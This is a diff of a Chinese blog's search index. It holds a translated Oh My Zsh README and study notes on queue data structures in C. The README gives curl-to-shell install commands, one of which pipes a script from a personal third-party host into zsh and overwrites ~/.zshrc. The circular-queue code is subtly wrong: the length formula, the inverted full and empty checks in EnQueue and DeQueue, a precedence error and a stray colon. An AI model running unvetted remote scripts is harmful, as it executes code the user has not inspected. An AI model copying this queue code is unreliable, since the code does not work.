+<h4 id="使用插件"><a href="#使用插件" class="headerlink" title="使用插件"></a><a href="https://github.com/ohmyzsh/ohmyzsh#using-plugins"></a>使用插件</h4><p>每个内置插件都包含一个<strong>自述文件</strong>，用于记录它。此自述文件应显示别名（如果插件添加了任何别名）以及该特定插件中包含的其他好东西。</p>
+<h3 id="主题"><a href="#主题" class="headerlink" title="主题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#themes"></a>主题</h3><p>我们承认这一点。在Oh My Zsh世界的早期，我们可能有点太快乐了。我们现在捆绑了一百五十多个主题。他们中的大多数在wiki上都有<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Themes">屏幕截图</a>（我们正在努力更新这个！看看他们！</p>
+<h4 id="选择主题"><a href="#选择主题" class="headerlink" title="选择主题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#selecting-a-theme"></a>选择主题</h4><p><em>Robby的主题是默认主题。这不是最花哨的。这不是最简单的一个。这对他来说是正确的。</em></p>
+<p>找到要使用的主题后，您需要编辑该文件。您将在那里看到一个环境变量（全部大写），如下所示：<code>~/.zshrc</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH_THEME=&quot;robbyrussell&quot;</span><br></pre></td></tr></table></figure>
+
+<p>要使用其他主题，只需更改值以匹配所需主题的名称即可。例如：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH_THEME=&quot;agnoster&quot; # (this is one of the fancy ones)</span><br><span class="line"><span class="meta"># </span><span class="language-bash">see https://github.com/ohmyzsh/ohmyzsh/wiki/Themes<span class="comment">#agnoster</span></span></span><br></pre></td></tr></table></figure>
+
+<p><em>注意：许多主题需要安装  <a href="https://github.com/powerline/fonts">Powerline 字体</a> 或  <a href="https://github.com/ryanoasis/nerd-fonts">书字体</a> 才能正确呈现。没有它们，这些主题将呈现<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/FAQ#i-have-a-weird-character-in-my-prompt">奇怪的提示符号</a></em></p>
+<p>打开一个新的终端窗口，您的提示应如下所示：</p>
+<p><a href="https://cloud.githubusercontent.com/assets/2618447/6316862/70f58fb6-ba03-11e4-82c9-c083bf9a6574.png"><img src="https://cloud.githubusercontent.com/assets/2618447/6316862/70f58fb6-ba03-11e4-82c9-c083bf9a6574.png" alt="“阿格诺斯特”主题"></a></p>
+<p>如果您没有找到适合您需求的主题，请查看wiki以获取<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/External-themes">更多主题</a>。</p>
+<p>如果您感到精力充沛，每次打开新的终端窗口时，都可以让计算机为您随机选择一个。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH_THEME=&quot;random&quot; # (...please let it be pie... please be some pie..)</span><br></pre></td></tr></table></figure>
+
+<p>如果您想从自己喜欢的主题列表中选择随机主题：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH_THEME_RANDOM_CANDIDATES=(</span><br><span class="line">  &quot;robbyrussell&quot;</span><br><span class="line">  &quot;agnoster&quot;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>如果您只知道自己不喜欢哪些主题，则可以将它们添加到忽略的列表中：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH_THEME_RANDOM_IGNORED=(pygmalion tjkirch_mod)</span><br></pre></td></tr></table></figure>
+
+<h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#faq"></a>常见问题</h3><p>如果您还有其他疑问或问题，可以在我们的<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/FAQ">常见问题解答</a>中找到解决方案。</p>
+<h2 id="高级主题"><a href="#高级主题" class="headerlink" title="高级主题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#advanced-topics"></a>高级主题</h2><p>如果你是那种喜欢亲自动手的人，这些部分可能会引起共鸣。</p>
+<h3 id="高级安装"><a href="#高级安装" class="headerlink" title="高级安装"></a><a href="https://github.com/ohmyzsh/ohmyzsh#advanced-installation"></a>高级安装</h3><p>某些用户可能希望手动安装 Oh My Zsh，或者更改默认路径或安装程序接受的其他设置（这些设置也记录在安装脚本的顶部）。</p>
+<h4 id="自定义目录"><a href="#自定义目录" class="headerlink" title="自定义目录"></a><a href="https://github.com/ohmyzsh/ohmyzsh#custom-directory"></a>自定义目录</h4><p>默认位置是（隐藏在您的主目录中，您可以使用<code>~/.oh-my-zsh``cd ~/.oh-my-zsh</code>)</p>
+<p>如果要使用环境变量更改安装目录，请在安装之前运行，或在安装管道结束之前对其进行设置，如下所示：<code>ZSH``export ZSH=/your/path</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH=&quot;$HOME/.dotfiles/oh-my-zsh&quot; sh install.sh</span><br></pre></td></tr></table></figure>
+
+<h4 id="无人参与安装"><a href="#无人参与安装" class="headerlink" title="无人参与安装"></a><a href="https://github.com/ohmyzsh/ohmyzsh#unattended-install"></a>无人参与安装</h4><p>如果您在自动安装过程中运行 Oh My Zsh 安装脚本，则可以将标志传递给该脚本。这将具有不尝试更改默认 shell 的效果，并且在安装完成后它也不会运行。<code>--unattended``install.sh``zsh</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot; &quot;&quot; --unattended</span><br></pre></td></tr></table></figure>
+
+<h4 id="从分叉存储库安装"><a href="#从分叉存储库安装" class="headerlink" title="从分叉存储库安装"></a><a href="https://github.com/ohmyzsh/ohmyzsh#installing-from-a-forked-repository"></a>从分叉存储库安装</h4><p>安装脚本还接受以下变量以允许安装不同的存储库：</p>
+<ul>
+<li><p><code>REPO</code>（默认值：）：其形式为 .如果设置此变量，安装程序将在 中查找存储库。<code>ohmyzsh/ohmyzsh``owner/repository``https://github.com/&#123;owner&#125;/&#123;repository&#125;</code></p>
+</li>
+<li><p><code>REMOTE</code>（默认值：）：这是 git 存储库克隆的完整 URL。如果要从不在 GitHub 上的分叉（GitLab、Bitbucket…）进行安装，或者要使用 SSH 而不是 HTTPS 进行克隆（），则可以使用此设置。<code>https://github.com/$&#123;REPO&#125;.git``git@github.com:user/project.git</code></p>
+<p>  <em>注意：它与设置  <code>REPO</code>  变量不兼容。此设置将优先。</em></p>
+</li>
+<li><p><code>BRANCH</code>（默认值：）：如果要在克隆存储库时更改要签出的默认分支，则可以使用此设置。这对于测试拉取请求或要使用 以外的分支可能很有用。<code>master``master</code></p>
+</li>
+</ul>
+<p>例如：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">REPO=apjanke/oh-my-zsh BRANCH=edge sh install.sh</span><br></pre></td></tr></table></figure>
+
+<h4 id="手动安装"><a href="#手动安装" class="headerlink" title="手动安装"></a><a href="https://github.com/ohmyzsh/ohmyzsh#manual-installation"></a>手动安装</h4><h5 id="1-克隆存储库"><a href="#1-克隆存储库" class="headerlink" title="1. 克隆存储库"></a><a href="https://github.com/ohmyzsh/ohmyzsh#1-clone-the-repository-"></a>1. 克隆存储库</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/ohmyzsh/ohmyzsh.git ~/.oh-my-zsh</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-可选，备份现有文件-zshrc"><a href="#2-可选，备份现有文件-zshrc" class="headerlink" title="2.可选，备份现有文件~/.zshrc"></a><a href="https://github.com/ohmyzsh/ohmyzsh#2-optionally-backup-your-existing-zshrc-file-"></a>2.<em>可选，</em>备份现有文件<code>~/.zshrc</code></h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp ~/.zshrc ~/.zshrc.orig</span><br></pre></td></tr></table></figure>
+
+<h5 id="3-创建新的-zsh-配置文件"><a href="#3-创建新的-zsh-配置文件" class="headerlink" title="3. 创建新的 zsh 配置文件"></a><a href="https://github.com/ohmyzsh/ohmyzsh#3-create-a-new-zsh-configuration-file-"></a>3. 创建新的 zsh 配置文件</h5><p>您可以通过复制我们为您包含的模板来创建新的 zsh 配置文件。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc</span><br></pre></td></tr></table></figure>
+
+<h5 id="4-更改默认外壳"><a href="#4-更改默认外壳" class="headerlink" title="4. 更改默认外壳"></a><a href="https://github.com/ohmyzsh/ohmyzsh#4-change-your-default-shell-"></a>4. 更改默认外壳</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chsh -s $(which zsh)</span><br></pre></td></tr></table></figure>
+
+<p>您必须从用户会话注销并重新登录才能看到此更改。</p>
+<h5 id="5-初始化新的-zsh-配置"><a href="#5-初始化新的-zsh-配置" class="headerlink" title="5. 初始化新的 zsh 配置"></a><a href="https://github.com/ohmyzsh/ohmyzsh#5-initialize-your-new-zsh-configuration-"></a>5. 初始化新的 zsh 配置</h5><p>打开新的终端窗口后，它应该使用Oh My Zsh的配置加载zsh。</p>
+<h3 id="安装问题"><a href="#安装问题" class="headerlink" title="安装问题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#installation-problems"></a>安装问题</h3><p>如果您安装任何打嗝，以下是一些常见的修复程序。</p>
+<ul>
+<li>如果在切换到 后无法找到某些命令，则<em>可能需要</em>修改 in。<code>PATH``~/.zshrc``oh-my-zsh</code></li>
+<li>如果手动安装或更改了安装位置，请检查 中的环境变量。<code>ZSH``~/.zshrc</code></li>
+</ul>
+<h3 id="自定义插件和主题"><a href="#自定义插件和主题" class="headerlink" title="自定义插件和主题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#custom-plugins-and-themes"></a>自定义插件和主题</h3><p>如果要覆盖任何默认行为，只需在目录中添加一个新文件（以 结尾）。<code>.zsh``custom/</code></p>
+<p>如果您有许多功能可以很好地组合在一起，则可以将它们作为文件放在目录中，然后启用此插件。<code>XYZ.plugin.zsh``custom/plugins/</code></p>
+<p>如果要覆盖使用 Oh My Zsh 分发的插件的功能，请在目录中创建一个同名的插件，该插件将被加载，而不是 .<code>custom/plugins/``plugins/</code></p>
+<h2 id="获取更新"><a href="#获取更新" class="headerlink" title="获取更新"></a><a href="https://github.com/ohmyzsh/ohmyzsh#getting-updates"></a>获取更新</h2><p>默认情况下，系统将提示您每 2 周检查一次更新。您可以在<strong>加载Oh My Zsh之前</strong>，通过向文件添加一行来选择其他更新模式：<code>~/.zshrc</code></p>
+<ol>
+<li><p>自动更新，无确认提示：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zstyle &#x27;:omz:update&#x27; mode auto</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如果有可用的更新，只需每隔几天提供一次提醒：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zstyle &#x27;:omz:update&#x27; mode reminder</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>要完全禁用自动更新：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zstyle &#x27;:omz:update&#x27; mode disabled</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>注意：您可以使用以下设置控制 Oh My Zsh 检查更新的频率：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">This will check <span class="keyword">for</span> updates every 7 days</span></span><br><span class="line">zstyle &#x27;:omz:update&#x27; frequency 7</span><br><span class="line"><span class="meta"># </span><span class="language-bash">This will check <span class="keyword">for</span> updates every time you open the terminal (not recommended)</span></span><br><span class="line">zstyle &#x27;:omz:update&#x27; frequency 0</span><br></pre></td></tr></table></figure>
+
+<h3 id="手动更新"><a href="#手动更新" class="headerlink" title="手动更新"></a><a href="https://github.com/ohmyzsh/ohmyzsh#manual-updates"></a>手动更新</h3><p>如果你想在任何时间点更新（也许有人刚刚发布了一个新插件，你不想等一个星期？），你只需要运行：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">omz update</span><br></pre></td></tr></table></figure>
+
+<p>魔法！🎉</p>
+<h2 id="卸载-Oh-My-Zsh"><a href="#卸载-Oh-My-Zsh" class="headerlink" title="卸载 Oh My Zsh"></a><a href="https://github.com/ohmyzsh/ohmyzsh#uninstalling-oh-my-zsh"></a>卸载 Oh My Zsh</h2><p>哦，我的Zsh并不适合所有人。我们会想念你的，但我们想让这很容易分手。</p>
+<p>如果要卸载 ，只需从命令行运行即可。它将删除自身并还原以前的配置或配置。<code>oh-my-zsh``uninstall_oh_my_zsh``bash``zsh</code></p>
+<h2 id="【推荐】国内脚本配置安装"><a href="#【推荐】国内脚本配置安装" class="headerlink" title="【推荐】国内脚本配置安装"></a>【推荐】国内脚本配置安装</h2><p>考虑到官方方法，需要连接GitHub；如果你的设备无法有效访问GitHub。可以使用我配置的脚本：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zsh -c &quot;$(curl -fsSL &#x27;https://api.host.mintimate.cn/fileHost/public/download/1P0R&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+<p>为了保证脚本能顺利运行，你的Linux&#x2F;Mac服务器需要：</p>
+<blockquote>
+<p>提前安装curl、unzip,如果有~&#x2F;.zshrc文件，最好提前备份，否则本脚本自动更改原本的.zshrc文件为zshrcBak</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>开源项目</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>tools</tag>
+        <tag>wiki</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>WIKI - Themes From Oh My Zsh</title>
     <url>/2022/04/28/ohmyzsh-themes/</url>
     <content><![CDATA[<blockquote>
@@ -3196,6 +3196,71 @@
       </tags>
   </entry>
   <entry>
+    <title>Queue Structures</title>
+    <url>/2021/05/29/queue-struct/</url>
+    <content><![CDATA[<h3 id="队列（FIFO）"><a href="#队列（FIFO）" class="headerlink" title="队列（FIFO）"></a>队列（FIFO）</h3><ol>
+<li><h4 id="定义：只允许在一段插入另一端删除的-先进先出-x3D-x3D-排队-x3D-x3D-线性表"><a href="#定义：只允许在一段插入另一端删除的-先进先出-x3D-x3D-排队-x3D-x3D-线性表" class="headerlink" title="定义：只允许在一段插入另一端删除的 先进先出 &#x3D;&#x3D;排队&#x3D;&#x3D; 线性表"></a>定义：只允许在一段插入另一端删除的 先进先出 &#x3D;&#x3D;排队&#x3D;&#x3D; 线性表</h4><ol>
+<li>抽象数据类型（Queue）：P94~95</li>
+</ol>
+</li>
+<li><h4 id="顺序队列-x3D-x3D-gt-循环队列（头尾相接的改进版顺序队，解决”假溢出“）"><a href="#顺序队列-x3D-x3D-gt-循环队列（头尾相接的改进版顺序队，解决”假溢出“）" class="headerlink" title="顺序队列 &#x3D;&#x3D;&gt; 循环队列（头尾相接的改进版顺序队，解决”假溢出“）"></a>顺序队列 &#x3D;&#x3D;&gt; 循环队列（头尾相接的改进版顺序队，解决”假溢出“）</h4><ol>
+<li>队头指针：front</li>
+<li>队尾指针：rear</li>
+<li>队列最大尺寸：QueueSize</li>
+<li>假溢出：数组中前端下标空闲，往后入队超出数组长度，非正常溢出，称为“假溢出”</li>
+<li>循环队列两种判断队空队满方法<ol>
+<li>方法一：设置<strong>标志变量flag</strong>，front &#x3D;&#x3D; rear，且flag&#x3D;0时，队空；front &#x3D;&#x3D; rear，且flag&#x3D;&#x3D;1，队满</li>
+<li>方法二：<strong>保留一个元素空间</strong>，front &#x3D;&#x3D; rear，队空；数组中剩余一个空闲单位，即条件为：<code>(rear+1)%QueueSize == front</code>，队满<ol>
+<li><p>队列长度：<span style="color: red;">(rear - front + QueueSize)%QueueSize</span> （通用长度计算公式）</p>
+<ol>
+<li>当rear &gt; front：rear-front</li>
+<li>当rear &lt; front：rear-front+QueueSize</li>
+</ol>
+</li>
+<li><p>循环队列顺序存储<strong>结构定义</strong>：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> QElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    QElemType data[MAXSIZE];	<span class="comment">//数组存放</span></span><br><span class="line">    <span class="type">int</span> front;	<span class="comment">//队头指针</span></span><br><span class="line">    <span class="type">int</span> rear;	<span class="comment">//队尾指针</span></span><br><span class="line">&#125;SqQueue;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>初始化（建立）<strong>空队</strong>：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Status <span class="title function_">InitQueue</span><span class="params">(SqQueue *Q)</span></span><br><span class="line">&#123;</span><br><span class="line">    Q-&gt;front = <span class="number">0</span>;</span><br><span class="line">    Q-&gt;rear = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>返回队列长度：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">QueueLength</span><span class="params">(SqQueue Q)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (Q.rear-&gt;Q.front+MAXSIZE)%MAXSIZE;	<span class="comment">//循环队通用长度计算公式</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>入队：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1. 判断队满</span></span><br><span class="line"><span class="comment">2. 元素e赋值给队尾rear数据域data（排队）</span></span><br><span class="line"><span class="comment">3. 队尾rear后移一位，若最后一位转到头部</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">EnQueue</span><span class="params">(SqQueue *Q,QElemType e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>((Q.rear+<span class="number">1</span>)%MAXSIZE == Q.front)	<span class="comment">//1</span></span><br><span class="line">    &#123;</span><br><span class="line">        Q-&gt;data[Q-&gt;rear] = e;	<span class="comment">//2</span></span><br><span class="line">        Q-&gt;rear = (Q-&gt;rear+<span class="number">1</span>)%MAXSIZE;	<span class="comment">//3</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>出队:</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1. 判断队空</span></span><br><span class="line"><span class="comment">2. 取出队头front指针数据域赋值给*e</span></span><br><span class="line"><span class="comment">3. 队头front后移，若最后一位则转到头部</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">DeQueue</span><span class="params">(SqQueue *Q,QElemType *e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q-&gt;front == Q-&gt;rear)	<span class="comment">//1</span></span><br><span class="line">    &#123;</span><br><span class="line">    *e = Q-&gt;data[Q-&gt;front];	<span class="comment">//2</span></span><br><span class="line">    Q-&gt;front = Q-&gt;front+<span class="number">1</span>%MAXSIZE;	<span class="comment">//3</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+<li><h4 id="链队（尾进头出的单链表）"><a href="#链队（尾进头出的单链表）" class="headerlink" title="链队（尾进头出的单链表）"></a>链队（<span style="color: red;">尾进头出</span>的单链表）</h4><ol>
+<li><p>空链队：front、rear 均指向<strong>头结点（含有）</strong></p>
+</li>
+<li><p>链队列结构建立：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> QElemType;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">结点结构建立：</span></span><br><span class="line"><span class="comment">    存放数据变量、next指针域</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>	<span class="title">QNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">QNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;QNode,*QueuePtr;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">队列链表结构建立：</span></span><br><span class="line"><span class="comment">    队头、队尾指针定义</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    QueuePtr front, rear;</span><br><span class="line">&#125;LinkQueue;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>链队（队尾）入队：<span style="color: proplue;">变动尾指针rear</span></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1. 动态生成新结点s</span></span><br><span class="line"><span class="comment">2. 异常判断：动态生成是否成功，内存溢出</span></span><br><span class="line"><span class="comment">3. 数据e赋值给结点s的数据域</span></span><br><span class="line"><span class="comment">4. 结点s指针域尾NULL，作为队尾</span></span><br><span class="line"><span class="comment">5. （原）尾指针rear指向的结点next指向（新结点）s</span></span><br><span class="line"><span class="comment">6. 尾指针rear指向新结点s</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">EnQueue</span><span class="params">(LinkQueue *Q,<span class="type">int</span> e)</span></span><br><span class="line">&#123;</span><br><span class="line">    QueuePtr s = (QueuePtr)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(QNode));	<span class="comment">//1</span></span><br><span class="line">    <span class="keyword">if</span>(!s)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(OVERFLOW);	<span class="comment">//2</span></span><br><span class="line">    &#125;</span><br><span class="line">    s-&gt;data = e;	<span class="comment">//3</span></span><br><span class="line">    s-&gt;next = <span class="literal">NULL</span>:	<span class="comment">//4</span></span><br><span class="line">    Q-&gt;rear-&gt;next = s;	<span class="comment">//5</span></span><br><span class="line">    Q-&gt;rear = s;	<span class="comment">//6</span></span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>链队（队头）出队：<span style="color: proplue;">变动头指针front</span></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1. 生成新指针变量p用于存放待删除结点</span></span><br><span class="line"><span class="comment">2. 异常检测：判断队空</span></span><br><span class="line"><span class="comment">3，队头结点（头指针的指针域next指向的结点）暂存到p</span></span><br><span class="line"><span class="comment">4. 取出暂存结点的数据域到*e</span></span><br><span class="line"><span class="comment">5. 此结点的指针域next指向的下一个结点 赋值给 头指针的指针域指向的结点，成为新的队头结点</span></span><br><span class="line"><span class="comment">6. 判断此结点是否为队尾（即原队列只存在一个数据），则将尾指针初始化空队（指向头结点）</span></span><br><span class="line"><span class="comment">7. 释放暂存结点p</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">DeQueue</span><span class="params">(LinkQueue *Q,<span class="type">int</span> *e)</span></span><br><span class="line">&#123;</span><br><span class="line">    QueuePtr p;	<span class="comment">//1</span></span><br><span class="line">    <span class="keyword">if</span>(Q-&gt;rear == Q-&gt;front)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;	<span class="comment">//2</span></span><br><span class="line">    &#125;</span><br><span class="line">    p = Q-&gt;front-&gt;next;	<span class="comment">//3</span></span><br><span class="line">    *e = p-&gt;data;	<span class="comment">//4</span></span><br><span class="line">    Q-&gt;front-&gt;next = p-&gt;next;	<span class="comment">//5</span></span><br><span class="line">    <span class="keyword">if</span>(Q-&gt;rear == p)</span><br><span class="line">    &#123;</span><br><span class="line">        Q-&gt;rear = Q-&gt;front;	<span class="comment">//6</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>计算机综合</category>
+        <category>408计算机</category>
+      </categories>
+      <tags>
+        <tag>数据结构</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Stack Structures</title>
     <url>/2021/05/29/stack-struct/</url>
     <content><![CDATA[<h3 id="栈（LIFO结构）"><a href="#栈（LIFO结构）" class="headerlink" title="栈（LIFO结构）"></a>栈（LIFO结构）</h3><ol>
@@ -3270,71 +3335,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Queue Structures</title>
-    <url>/2021/05/29/queue-struct/</url>
-    <content><![CDATA[<h3 id="队列（FIFO）"><a href="#队列（FIFO）" class="headerlink" title="队列（FIFO）"></a>队列（FIFO）</h3><ol>
-<li><h4 id="定义：只允许在一段插入另一端删除的-先进先出-x3D-x3D-排队-x3D-x3D-线性表"><a href="#定义：只允许在一段插入另一端删除的-先进先出-x3D-x3D-排队-x3D-x3D-线性表" class="headerlink" title="定义：只允许在一段插入另一端删除的 先进先出 &#x3D;&#x3D;排队&#x3D;&#x3D; 线性表"></a>定义：只允许在一段插入另一端删除的 先进先出 &#x3D;&#x3D;排队&#x3D;&#x3D; 线性表</h4><ol>
-<li>抽象数据类型（Queue）：P94~95</li>
-</ol>
-</li>
-<li><h4 id="顺序队列-x3D-x3D-gt-循环队列（头尾相接的改进版顺序队，解决”假溢出“）"><a href="#顺序队列-x3D-x3D-gt-循环队列（头尾相接的改进版顺序队，解决”假溢出“）" class="headerlink" title="顺序队列 &#x3D;&#x3D;&gt; 循环队列（头尾相接的改进版顺序队，解决”假溢出“）"></a>顺序队列 &#x3D;&#x3D;&gt; 循环队列（头尾相接的改进版顺序队，解决”假溢出“）</h4><ol>
-<li>队头指针：front</li>
-<li>队尾指针：rear</li>
-<li>队列最大尺寸：QueueSize</li>
-<li>假溢出：数组中前端下标空闲，往后入队超出数组长度，非正常溢出，称为“假溢出”</li>
-<li>循环队列两种判断队空队满方法<ol>
-<li>方法一：设置<strong>标志变量flag</strong>，front &#x3D;&#x3D; rear，且flag&#x3D;0时，队空；front &#x3D;&#x3D; rear，且flag&#x3D;&#x3D;1，队满</li>
-<li>方法二：<strong>保留一个元素空间</strong>，front &#x3D;&#x3D; rear，队空；数组中剩余一个空闲单位，即条件为：<code>(rear+1)%QueueSize == front</code>，队满<ol>
-<li><p>队列长度：<span style="color: red;">(rear - front + QueueSize)%QueueSize</span> （通用长度计算公式）</p>
-<ol>
-<li>当rear &gt; front：rear-front</li>
-<li>当rear &lt; front：rear-front+QueueSize</li>
-</ol>
-</li>
-<li><p>循环队列顺序存储<strong>结构定义</strong>：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> QElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    QElemType data[MAXSIZE];	<span class="comment">//数组存放</span></span><br><span class="line">    <span class="type">int</span> front;	<span class="comment">//队头指针</span></span><br><span class="line">    <span class="type">int</span> rear;	<span class="comment">//队尾指针</span></span><br><span class="line">&#125;SqQueue;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>初始化（建立）<strong>空队</strong>：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Status <span class="title function_">InitQueue</span><span class="params">(SqQueue *Q)</span></span><br><span class="line">&#123;</span><br><span class="line">    Q-&gt;front = <span class="number">0</span>;</span><br><span class="line">    Q-&gt;rear = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>返回队列长度：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">QueueLength</span><span class="params">(SqQueue Q)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (Q.rear-&gt;Q.front+MAXSIZE)%MAXSIZE;	<span class="comment">//循环队通用长度计算公式</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>入队：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1. 判断队满</span></span><br><span class="line"><span class="comment">2. 元素e赋值给队尾rear数据域data（排队）</span></span><br><span class="line"><span class="comment">3. 队尾rear后移一位，若最后一位转到头部</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">EnQueue</span><span class="params">(SqQueue *Q,QElemType e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>((Q.rear+<span class="number">1</span>)%MAXSIZE == Q.front)	<span class="comment">//1</span></span><br><span class="line">    &#123;</span><br><span class="line">        Q-&gt;data[Q-&gt;rear] = e;	<span class="comment">//2</span></span><br><span class="line">        Q-&gt;rear = (Q-&gt;rear+<span class="number">1</span>)%MAXSIZE;	<span class="comment">//3</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>出队:</p>
